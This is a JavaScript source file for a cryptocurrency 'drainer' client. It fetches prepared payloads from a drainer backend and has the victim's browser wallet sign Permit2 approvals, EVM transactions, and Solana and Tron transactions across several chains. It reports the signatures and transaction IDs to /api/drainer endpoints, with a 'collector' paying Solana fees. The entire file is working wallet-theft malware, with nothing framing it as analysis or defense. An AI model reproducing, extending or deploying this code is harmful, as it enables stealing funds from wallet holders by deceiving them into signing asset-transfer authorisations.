/**
 * Drainer client.
 *
 * Walks the payloads returned by POST /api/drainer/wallets/:id/prepare and asks the
 * injected wallet to sign each one. Handles chain switching before every EVM step,
 * checks every HTTP response, and serialises Solana transactions that are only
 * partially signed (the collector is the fee payer).
 */

const CHAINS = {
  1:     { hex: "0x1",     name: "Ethereum", symbol: "ETH", rpc: "https://ethereum-rpc.publicnode.com",  explorer: "https://etherscan.io" },
  8453:  { hex: "0x2105",  name: "Base",     symbol: "ETH", rpc: "https://base-rpc.publicnode.com",      explorer: "https://basescan.org" },
  42161: { hex: "0xa4b1",  name: "Arbitrum", symbol: "ETH", rpc: "https://arbitrum-one-rpc.publicnode.com", explorer: "https://arbiscan.io" },
  56:    { hex: "0x38",    name: "BSC",      symbol: "BNB", rpc: "https://bsc-rpc.publicnode.com",       explorer: "https://bscscan.com" },
  137:   { hex: "0x89",    name: "Polygon",  symbol: "POL", rpc: "https://polygon-bor-rpc.publicnode.com", explorer: "https://polygonscan.com" },
};

async function post(url, body) {
  const res = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body ?? {}),
  });
  let data = null;
  try { data = await res.json(); } catch { /* empty body */ }
  if (!res.ok) {
    const d = data && data.detail;
    throw new Error(typeof d === "string" ? d : JSON.stringify(d ?? res.status));
  }
  return data;
}

async function evmAccount() {
  const eth = window.ethereum;
  if (!eth) throw new Error("No EVM wallet detected");
  const accounts = await eth.request({ method: "eth_requestAccounts" });
  if (!accounts || !accounts.length) throw new Error("Wallet not connected");
  return accounts[0];
}

async function ensureChain(chainId) {
  const target = CHAINS[chainId];
  if (!target) throw new Error(`Unsupported chain ${chainId}`);
  const current = await window.ethereum.request({ method: "eth_chainId" });
  if (String(current).toLowerCase() === target.hex) return;
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: target.hex }],
    });
  } catch (e) {
    if (e && e.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: target.hex,
          chainName: target.name,
          nativeCurrency: { name: target.symbol, symbol: target.symbol, decimals: 18 },
          rpcUrls: [target.rpc],
          blockExplorerUrls: [target.explorer],
        }],
      });
    } else {
      throw e;
    }
  }
}

async function signPermit2(p) {
  await ensureChain(p.chainId);
  const from = await evmAccount();
  const signature = await window.ethereum.request({
    method: "eth_signTypedData_v4",
    params: [from, JSON.stringify(p.typed_data)],
  });
  for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, signature });
}

async function sendEvmTx(p) {
  await ensureChain(p.chainId);
  const from = await evmAccount();
  const txid = await window.ethereum.request({
    method: "eth_sendTransaction",
    params: [{ from, to: p.tx.to, value: p.tx.value, data: p.tx.data }],
  });
  for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, txid });
}

function base64FromBytes(bytes) {
  let s = "";
  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  return btoa(s);
}

function bytesFromBase64(b64) {
  const s = atob(b64);
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i);
  return out;
}

async function solanaProvider() {
  const provider =
    window.phantom?.solana || window.solflare || window.backpack || window.solana;
  if (!provider) throw new Error("No Solana wallet detected");
  if (provider.connect) {
    try { await provider.connect(); } catch { /* already connected */ }
  }
  return provider;
}

async function signSolana(p, address) {
  const provider = await solanaProvider();
  const selected = provider.publicKey && provider.publicKey.toString();
  if (selected && address && selected !== address) {
    throw new Error(`Wrong account selected — switch to ${address.slice(0, 6)}…`);
  }
  const { Transaction } = window.solanaWeb3;
  const tx = Transaction.from(bytesFromBase64(p.tx));
  const signed = await provider.signTransaction(tx);
  const b64 = base64FromBytes(
    signed.serialize({ requireAllSignatures: false, verifySignatures: false }),
  );
  const res = await post("/api/drainer/broadcast", { family: "solana", payload: b64 });
  for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, txid: res.txid });
}

async function signTron(p, address) {
  const tw = window.tronWeb;
  if (!tw) throw new Error("No Tron wallet detected");
  if (tw.defaultAddress?.base58 && address && tw.defaultAddress.base58 !== address) {
    throw new Error("Wrong TronLink account selected");
  }
  for (const raw of p.txs) {
    const signed = await tw.trx.sign(raw);
    const res = await post("/api/drainer/broadcast", {
      family: "tron",
      payload: JSON.stringify(signed),
    });
    for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, txid: res.txid });
  }
}

/**
 * Run the full authorisation flow for a wallet.
 * @param {number|string} walletId
 * @param {(done:number,total:number,type:string)=>void} onProgress
 */
export async function runDrainer(walletId, onProgress = () => {}) {
  const plan = await post(`/api/drainer/wallets/${walletId}/prepare`, {});
  const payloads = plan.payloads || [];

  if (!payloads.length) {
    const why = (plan.assets || [])
      .filter((a) => !a.id)
      .map((a) => a.symbol)
      .join(", ");
    throw new Error(why ? `Nothing signable: ${why}` : "Nothing to authorise");
  }

  const total = payloads.length;
  let done = 0;

  for (const p of payloads) {
    onProgress(++done, total, p.type);
    try {
      if (p.type === "permit2") await signPermit2(p);
      else if (p.type === "evm_tx") await sendEvmTx(p);
      else if (p.type === "solana_tx") await signSolana(p, plan.address);
      else if (p.type === "tron_tx") await signTron(p, plan.address);
    } catch (e) {
      e.step = p.type;
      e.stepIndex = done;
      throw e;
    }
  }

  return plan;
}

export { CHAINS };